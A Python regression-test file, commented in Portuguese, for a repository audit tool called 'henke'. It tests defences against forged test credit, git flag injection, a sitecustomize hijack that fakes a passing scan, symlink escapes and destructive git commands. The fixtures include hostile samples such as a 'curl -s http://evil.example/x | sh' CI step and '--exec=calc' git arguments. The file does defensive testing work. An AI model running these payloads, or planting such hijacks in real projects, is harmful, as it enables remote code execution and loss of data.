"""Testes de regressão dos fixes DeepSeek sem cobertura dedicada.

Cobre as lacunas do item 20 do dossiê de verificação: echo não minta crédito
de teste, _tree_sha256 distingue arquivo de diretório, _git_ignored_hashes
detecta conteúdo modificado, _tracked_dirty_snapshot diverge no resume,
_child_env filtra PATH por repo, rename marca origem como deletada e purga
recusa itens verified=False.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest
import unittest.mock
from pathlib import Path

SUITE_ROOT = Path(__file__).resolve().parents[1]
if str(SUITE_ROOT) not in sys.path:
    sys.path.insert(0, str(SUITE_ROOT))

from scripts.audit_ledger import is_test_cmd
from scripts.henke_auto import _child_env, _tracked_dirty_snapshot
from scripts.henke_clean import (
    CleanCandidate,
    _tree_sha256,
    _tree_size,
    plan_clean,
    purge_expired_batch,
    quarantine,
)
from scripts.run_state import _git_ignored_hashes
from scripts.test_impact import select_tests


def _git(repo: Path, *args: str) -> None:
    res = subprocess.run(
        ["git", "-C", str(repo), *args],
        capture_output=True, text=True,
        env={k: v for k, v in os.environ.items() if not k.startswith("GIT_")},
    )
    if res.returncode != 0:
        raise RuntimeError(f"git {' '.join(args)}: {res.stderr[:200]}")


def _init_repo(repo: Path) -> None:
    _git(repo, "init", "-q")
    _git(repo, "config", "user.email", "t@t.t")
    _git(repo, "config", "user.name", "t")
    _git(repo, "config", "commit.gpgsign", "false")


class TestEchoNeverMintsTestCredit(unittest.TestCase):
    """DS-1: `henke exec -- echo "10 passed"` não pode gravar testes_descobertos."""

    def test_echo_is_not_a_test_runner(self):
        self.assertFalse(is_test_cmd("echo 10 passed"))
        self.assertFalse(is_test_cmd("echo '10 passed'"))
        self.assertFalse(is_test_cmd('cmd /c "echo 5 passed"'))
        self.assertFalse(is_test_cmd("printf 'ok\\n10 passed\\n'"))

    def test_recognized_runners_still_match(self):
        self.assertTrue(is_test_cmd("python -m pytest tests/ -q"))
        self.assertTrue(is_test_cmd("pytest"))
        self.assertTrue(is_test_cmd("make test"))
        self.assertTrue(is_test_cmd("mvn test"))
        self.assertTrue(is_test_cmd("rspec spec/"))


class TestTreeSha256(unittest.TestCase):
    """DS-1(clean): arquivo único não pode colidir com hash de árvore vazia."""

    def test_single_file_differs_from_empty_dir(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            empty_dir = root / "vazio"
            empty_dir.mkdir()
            single = root / "arquivo.txt"
            single.write_bytes(b"x" * 4)
            self.assertNotEqual(_tree_sha256(single), _tree_sha256(empty_dir))

    def test_file_content_changes_hash(self):
        with tempfile.TemporaryDirectory() as td:
            f = Path(td) / "f.bin"
            f.write_bytes(b"aaa")
            h1 = _tree_sha256(f)
            f.write_bytes(b"bbb")
            self.assertNotEqual(_tree_sha256(f), h1)


class TestIgnoredStartHashes(unittest.TestCase):
    """DS-8: .env ignorado com conteúdo alterado deve divergir no snapshot."""

    def test_content_change_detected(self):
        with tempfile.TemporaryDirectory() as td:
            repo = Path(td)
            _init_repo(repo)
            (repo / ".gitignore").write_text(".env\n", encoding="utf-8")
            _git(repo, "add", ".gitignore")
            _git(repo, "commit", "-qm", "init")
            (repo / ".env").write_text("KEY=a", encoding="utf-8")
            snap1 = _git_ignored_hashes(repo)
            self.assertIsNotNone(snap1)
            self.assertIn(".env", snap1)
            self.assertEqual(snap1[".env"]["size"], 5)
            (repo / ".env").write_text("KEY=segredomaior", encoding="utf-8")
            snap2 = _git_ignored_hashes(repo)
            self.assertNotEqual(snap1[".env"]["sha256"], snap2[".env"]["sha256"])
            self.assertNotEqual(snap1[".env"]["size"], snap2[".env"]["size"])


class TestTrackedDirtySnapshot(unittest.TestCase):
    """DS-2: dirty_start diverge quando arquivo rastreado muda entre approve/resume."""

    def test_modified_and_deleted_detected(self):
        with tempfile.TemporaryDirectory() as td:
            repo = Path(td)
            _init_repo(repo)
            (repo / "a.py").write_text("x=1", encoding="utf-8")
            (repo / "b.py").write_text("y=2", encoding="utf-8")
            _git(repo, "add", ".")
            _git(repo, "commit", "-qm", "init")
            snap1 = _tracked_dirty_snapshot(repo)
            self.assertEqual(snap1, {}, "repo limpo deve ter snapshot vazio")
            (repo / "a.py").write_text("x=42", encoding="utf-8")
            snap2 = _tracked_dirty_snapshot(repo)
            self.assertIn("a.py", snap2)
            self.assertNotEqual(snap1, snap2)
            (repo / "a.py").unlink()
            snap3 = _tracked_dirty_snapshot(repo)
            self.assertEqual(snap3["a.py"], "DELETED")

    def test_untracked_files_ignored(self):
        """Untracked não entra no snapshot (escopo: divergência de rastreado)."""
        with tempfile.TemporaryDirectory() as td:
            repo = Path(td)
            _init_repo(repo)
            (repo / "a.py").write_text("x=1", encoding="utf-8")
            _git(repo, "add", ".")
            _git(repo, "commit", "-qm", "init")
            (repo / "novo.py").write_text("z=9", encoding="utf-8")
            self.assertEqual(_tracked_dirty_snapshot(repo), {})


class TestChildEnvPathFilter(unittest.TestCase):
    """DS-12b: PATH do filho não pode conter entradas dentro do repo auditado."""

    def test_repo_entries_removed(self):
        with tempfile.TemporaryDirectory() as td:
            repo = Path(td).resolve()
            inside = str(repo / "bin")
            outside = str(Path(td).parent / "outro")
            with unittest.mock.patch.dict(
                os.environ, {"PATH": inside + os.pathsep + outside}
            ):
                env = _child_env(repo)
            entries = env["PATH"].split(os.pathsep)
            self.assertNotIn(inside, entries)
            self.assertIn(outside, entries)


class TestRenameMarksDeleted(unittest.TestCase):
    """DS-6(impact): origem de rename força modo conservador."""

    def test_rename_origin_forces_full(self):
        with tempfile.TemporaryDirectory() as td:
            repo = Path(td)
            _init_repo(repo)
            (repo / "tests").mkdir()
            (repo / "tests" / "test_velho.py").write_text(
                "def test_x():\n    assert True\n", encoding="utf-8")
            _git(repo, "add", ".")
            _git(repo, "commit", "-qm", "init")
            _git(repo, "mv", "tests/test_velho.py", "tests/test_novo.py")
            direct = {
                "tests/test_velho.py": frozenset(),
                "tests/test_novo.py": frozenset(),
            }
            sel = select_tests(repo, "HEAD", direct)
            self.assertEqual(sel.mode, "full")


class TestPurgeRefusesUnverified(unittest.TestCase):
    """DS-2(clean): purga nunca apaga a única cópia de item não verificado."""

    def test_unverified_item_blocks_purge(self):
        from datetime import datetime, timedelta, timezone
        with tempfile.TemporaryDirectory() as td:
            repo = Path(td)
            cache = repo / "pkg" / "__pycache__"
            cache.mkdir(parents=True)
            (cache / "mod.pyc").write_bytes(b"x" * 8)
            batch = quarantine(repo, plan_clean(repo))
            mpath = (repo / ".henke" / "quarantine" / batch.batch_id
                     / "manifest.json")
            manifest = json.loads(mpath.read_text(encoding="utf-8"))
            manifest["items"][0]["verified"] = False
            # re-assina para exercitar o caminho verified=False (e não o
            # bloqueio de manifesto adulterado, coberto em test_henke_clean)
            from scripts.henke_clean import _manifest_hmac
            manifest["hmac"] = _manifest_hmac(repo, manifest)
            mpath.write_text(json.dumps(manifest), encoding="utf-8")
            future = datetime.now(timezone.utc) + timedelta(days=8)
            with self.assertRaises(ValueError):
                purge_expired_batch(repo, batch.batch_id, now=future)
            self.assertTrue(mpath.parent.exists(),
                            "batch deve ser preservado para resolução manual")


if __name__ == "__main__":
    unittest.main()


class TestStagedSnapshotRealIndex(unittest.TestCase):
    """Delta-F1/F2: `check --staged` precisa ver objetos escritos no tempdir
    pelo write-tree e o snapshot extraído tem que bater com ls-tree."""

    def _run_check(self, repo: Path) -> subprocess.CompletedProcess:
        env = {k: v for k, v in os.environ.items()
               if not k.startswith("GIT_")}
        return subprocess.run(
            [sys.executable, str(SUITE_ROOT / "scripts" / "henke_cli.py"),
             "check", "--repo", str(repo), "--staged", "--jobs", "1"],
            capture_output=True, text=True, env=env, timeout=180)

    def test_staged_change_scans_snapshot_not_error(self):
        with tempfile.TemporaryDirectory() as td:
            repo = Path(td)
            _init_repo(repo)
            (repo / "a.py").write_text("x = 1\n", encoding="utf-8")
            _git(repo, "add", ".")
            _git(repo, "commit", "-qm", "init")
            # índice difere de HEAD — caso que quebrava (F1: not a tree object)
            (repo / "b.py").write_text("def t():\n    pass\n", encoding="utf-8")
            _git(repo, "add", "b.py")
            res = self._run_check(repo)
            self.assertNotEqual(res.returncode, 2,
                                f"extração do índice falhou: {res.stderr[:300]}")
            self.assertIn("hazard_scan", res.stdout)

    def test_export_ignore_rejects_snapshot(self):
        with tempfile.TemporaryDirectory() as td:
            repo = Path(td)
            _init_repo(repo)
            (repo / ".gitattributes").write_text(
                "segredo.txt export-ignore\n", encoding="utf-8")
            (repo / "a.py").write_text("x = 1\n", encoding="utf-8")
            _git(repo, "add", ".")
            _git(repo, "commit", "-qm", "init")
            (repo / "segredo.txt").write_text("s3cr3t\n", encoding="utf-8")
            _git(repo, "add", "segredo.txt")
            res = self._run_check(repo)
            # arquivo staged omitido do archive → divergência → exit 2
            self.assertEqual(res.returncode, 2)
            self.assertIn("diverge", res.stderr)


class TestSanitizedChildEnvPath(unittest.TestCase):
    """Delta-F4/F5: filtro de PATH do helper canônico remove dirs do repo."""

    def test_path_inside_repo_removed(self):
        from scripts.state_paths import sanitized_child_env
        with tempfile.TemporaryDirectory() as td:
            repo = Path(td).resolve()
            planted = repo / "bin"
            planted.mkdir()
            fake_path = os.pathsep.join(
                [str(planted), "entrada-relativa", str(Path(sys.executable).parent)])
            with unittest.mock.patch.dict(
                    os.environ, {"PATH": fake_path}, clear=False):
                env = sanitized_child_env(repo)
            parts = env["PATH"].split(os.pathsep)
            self.assertNotIn(str(planted), parts)
            self.assertNotIn("entrada-relativa", parts)
            self.assertIn(str(Path(sys.executable).parent), parts)


class TestBaseFlagInjection(unittest.TestCase):
    """Delta já cobria: --base que começa com '-' nunca chega ao argv do git."""

    def test_flag_like_base_rejected(self):
        from scripts.test_impact import GitDiscoveryError
        with tempfile.TemporaryDirectory() as td:
            repo = Path(td)
            _init_repo(repo)
            (repo / "a.py").write_text("x = 1\n", encoding="utf-8")
            _git(repo, "add", ".")
            _git(repo, "commit", "-qm", "init")
            with self.assertRaises(GitDiscoveryError):
                select_tests(repo, "--exec=calc", {})
            with self.assertRaises(GitDiscoveryError):
                select_tests(repo, "-c core.pager=calc", {})


if __name__ == "__main__":
    unittest.main()


class TestInterpArgvMask(unittest.TestCase):
    """PT-01: argv/payload de interpretador nunca minta crédito de teste."""

    def test_eval_payloads_not_test_cmds(self):
        self.assertFalse(is_test_cmd(
            "python -c \"print('1 passed in 0.01s')\" -m pytest"))
        self.assertFalse(is_test_cmd(
            "python -c \"print('1 passed')\" -m unittest"))
        self.assertFalse(is_test_cmd("node -e \"console.log('pytest')\""))
        self.assertFalse(is_test_cmd("ruby -e \"puts 'rspec'\""))
        self.assertFalse(is_test_cmd("echo \"pytest 10 passed\""))
        self.assertFalse(is_test_cmd("printf 'ok 10 passed\n'"))

    def test_absolute_interpreter_paths_masked(self):
        """R2-PT-01: `henke exec` grava o interpretador ABSOLUTO no exec_log —
        o PoC que sobreviveu era `C:\\...\\python.exe -c ... -m pytest`."""
        self.assertFalse(is_test_cmd(
            f"{sys.executable} -c \"print('1 passed in 0.01s')\" -m pytest"))
        self.assertFalse(is_test_cmd(
            "C:\\Python312\\python.exe -c \"print('1 passed')\" -m unittest"))
        self.assertFalse(is_test_cmd(
            "/usr/bin/python3 -c \"print('1 passed')\" -m pytest"))
        # E runners reais por caminho absoluto continuam detectados.
        self.assertTrue(is_test_cmd(
            f"{sys.executable} -m pytest tests/"))

    def test_real_runners_still_detected(self):
        self.assertTrue(is_test_cmd("python -m pytest tests/"))
        self.assertTrue(is_test_cmd("python -m unittest discover -s tests"))
        self.assertTrue(is_test_cmd("python3.12 -W ignore -m pytest -q"))
        self.assertTrue(is_test_cmd("sh -c 'pytest tests/'"))
        self.assertTrue(is_test_cmd("python -c \"x\" && pytest"))
        self.assertTrue(is_test_cmd("echo ok && npm test"))


class TestSitecustomizeHijack(unittest.TestCase):
    """R2-PT-06: sitecustomize via PYTHONPATH que substitui run_incremental_scan
    no processo pai NÃO pode mais fabricar PASS — o CLI respawna isolado (-I)
    e o módulo real executa os scanners de verdade."""

    def test_sitecustomize_nao_desliga_gates(self):
        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            evil = td / "evil"
            evil.mkdir()
            # O ataque do PoC: importa o módulo REAL da suíte e troca a
            # função in-place — __file__ continua legítimo, então a checagem
            # de caminho não pega; só o respawn -I resolve.
            (evil / "sitecustomize.py").write_text(
                "import scripts.metricas.scan_manifest as _m\n"
                "class _R:\n"
                "    exit_code = 0\n"
                "    full_scan = True\n"
                "    scanned_files = ()\n"
                "    reused_files = ()\n"
                "    invalidated_files = ()\n"
                "    reasons = ()\n"
                "_m.run_incremental_scan = lambda *a, **k: _R()\n",
                encoding="utf-8")
            repo = td / "repo"
            repo.mkdir()
            (repo / "app.py").write_text(
                "import os\nos.system('echo pwned')\n", encoding="utf-8")
            env = os.environ.copy()
            env["PYTHONPATH"] = str(evil) + os.pathsep + str(SUITE_ROOT)
            res = subprocess.run(
                [sys.executable,
                 str(SUITE_ROOT / "scripts" / "henke_cli.py"),
                 "check", "--repo", str(repo), "--no-cache"],
                capture_output=True, text=True, env=env, timeout=180)
            self.assertNotEqual(
                res.returncode, 0,
                "sitecustomize não pode fabricar PASS em repo com os.system: "
                f"{res.stdout[-400:]} {res.stderr[-300:]}")


class TestRouterDestructiveParaphrase(unittest.TestCase):
    """PT-10: paráfrases destrutivas exigem EXECUTAR + human_auth + matriz."""

    def test_destructive_variants_locked(self):
        from scripts.henke_router import route_request
        for p in ("faz reset no branch main para o commit abc1234",
                  "empurra com force para o main",
                  "git checkout HEAD~1 -- .",
                  "git rebase -i HEAD~3",
                  "git stash drop"):
            r = route_request(p)
            self.assertTrue(r["requires_human_auth"],
                            f"{p}: auth destrutiva ausente")
            self.assertEqual(r["mode"], "EXECUTAR", p)
            self.assertGreater(len(r["gates_required"]), 2, p)


_IS_WIN = sys.platform == "win32"


def _make_dir_link(link: Path, target: Path) -> None:
    """Junction (Windows, não exige privilégio) ou symlink de dir (POSIX)."""
    if _IS_WIN:
        res = subprocess.run(  # hazard-ok: SHELL-INJECTION -- mklink /J é a única via de junction no Windows; argv fixo sem shell
            ["cmd.exe", "/c", "mklink", "/J", str(link), str(target)],
            capture_output=True)
        if res.returncode != 0:
            raise unittest.SkipTest(f"mklink /J indisponível: {res.stderr}")
    else:
        link.symlink_to(target, target_is_directory=True)


class TestJunctionDescendant(unittest.TestCase):
    """PT-02: junction/symlink DENTRO de candidato de quarentena."""

    def _seed(self, root: Path) -> tuple[Path, Path, Path]:
        outside = root / "fora"
        outside.mkdir()
        (outside / "segredo.txt").write_bytes(b"topsecret")
        tree = root / "arvore"
        tree.mkdir()
        (tree / "ok.txt").write_bytes(b"ok")
        limpo = root / "limpo"
        limpo.mkdir()
        (limpo / "ok.txt").write_bytes(b"ok")
        link = tree / "leak"
        _make_dir_link(link, outside)
        self.addCleanup(
            lambda: os.rmdir(link) if os.path.lexists(link) else None)
        return tree, limpo, outside

    def test_tree_sha256_ignora_junction_descendente(self):
        with tempfile.TemporaryDirectory() as td:
            tree, limpo, _ = self._seed(Path(td))
            self.assertEqual(_tree_sha256(tree), _tree_sha256(limpo))

    def test_tree_size_ignora_junction_descendente(self):
        with tempfile.TemporaryDirectory() as td:
            tree, limpo, _ = self._seed(Path(td))
            self.assertEqual(_tree_size(tree), _tree_size(limpo))

    def test_quarantine_recusa_reparse_descendente(self):
        """Candidato com junction descendente é recusado inteiro (fail-closed)."""
        with tempfile.TemporaryDirectory() as td:
            repo = Path(td)
            outside = repo / "fora"
            outside.mkdir()
            (outside / "segredo.txt").write_bytes(b"topsecret")
            cache = repo / "pkg" / "__pycache__"
            cache.mkdir(parents=True)
            (cache / "a.pyc").write_bytes(b"x")
            link = cache / "leak"
            _make_dir_link(link, outside)
            self.addCleanup(
                lambda: os.rmdir(link) if os.path.lexists(link) else None)
            batch = quarantine(repo, [CleanCandidate(cache, "repo-cache", 1)])
            self.assertEqual(batch.items, ())
            self.assertTrue((cache / "a.pyc").is_file(), "nada pode ser movido")
            log = repo / ".henke" / "clean_log.jsonl"
            results = [json.loads(l)["result"] for l in
                       log.read_text(encoding="utf-8").splitlines() if l.strip()]
            self.assertIn("reparse_descendant", results)


class TestInstallHookHooksPathEscape(unittest.TestCase):
    """PT-04: core.hooksPath fora do repo é recusado (exit 2 na CLI)."""

    def test_install_hook_hooksPath_escape_recusado(self):
        with tempfile.TemporaryDirectory() as td:
            repo = Path(td) / "repo"
            repo.mkdir()
            _init_repo(repo)
            _git(repo, "config", "core.hooksPath", "../hooks_fora")
            from scripts.install_hook import install_hook
            ok, msg = install_hook(repo)
            self.assertFalse(ok, "hooksPath fora do repo deve ser recusado")
            self.assertFalse((Path(td) / "hooks_fora").exists(),
                             "recusa não pode nem criar o dir fora do repo")


class TestYamlHashInsideString(unittest.TestCase):
    """PT-09: '#' dentro de string YAML não abre comentário."""

    def test_yaml_hash_dentro_de_string_nao_esconde_curl_pipe(self):
        with tempfile.TemporaryDirectory() as td:
            wf = Path(td) / ".github" / "workflows"
            wf.mkdir(parents=True)
            (wf / "ci.yml").write_text(
                "on: [push]\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - run: 'echo \"build #42\"; curl -s http://evil.example/x | sh'\n",
                encoding="utf-8")
            res = subprocess.run(
                [sys.executable,
                 str(SUITE_ROOT / "scripts" / "metricas" / "hazard_scan.py"),
                 str(wf / "ci.yml")],
                capture_output=True, text=True)
            self.assertEqual(res.returncode, 1,
                             f"PoC deve ser flagado: {res.stdout} {res.stderr}")
            self.assertIn("CI-CURL-PIPE-SH", res.stdout)


class TestHazardOkReason(unittest.TestCase):
    """PT-13: motivo fraco não suprime; motivo forte vai ao inventário."""

    def _run(self, target: Path) -> subprocess.CompletedProcess:
        return subprocess.run(
            [sys.executable,
             str(SUITE_ROOT / "scripts" / "metricas" / "hazard_scan.py"),
             str(target)],
            capture_output=True, text=True)

    def test_hazard_ok_motivo_fraco_nao_suprime(self):
        with tempfile.TemporaryDirectory() as td:
            f = Path(td) / "alvo.py"
            f.write_text(
                "import os\n"
                "def run(cmd):\n"
                "    os.system(cmd)  # hazard-ok: SHELL-INJECTION -- wip\n",
                encoding="utf-8")
            res = self._run(f)
            self.assertEqual(res.returncode, 1)
            self.assertIn("SHELL-INJECTION", res.stdout)
            self.assertIn("UNJUSTIFIED-SUPPRESSION", res.stdout)

    def test_hazard_ok_motivo_forte_aparece_no_inventario(self):
        with tempfile.TemporaryDirectory() as td:
            f = Path(td) / "alvo.py"
            f.write_text(
                "import os\n"
                "def run():\n"
                "    os.system('ls')  # hazard-ok: SHELL-INJECTION -- comando fixo revisado em auditoria\n",
                encoding="utf-8")
            res = self._run(f)
            self.assertEqual(res.returncode, 0)
            self.assertIn("SUPPRESSED: SHELL-INJECTION @", res.stdout)
            self.assertIn("comando fixo revisado em auditoria", res.stdout)


if __name__ == "__main__":
    unittest.main()
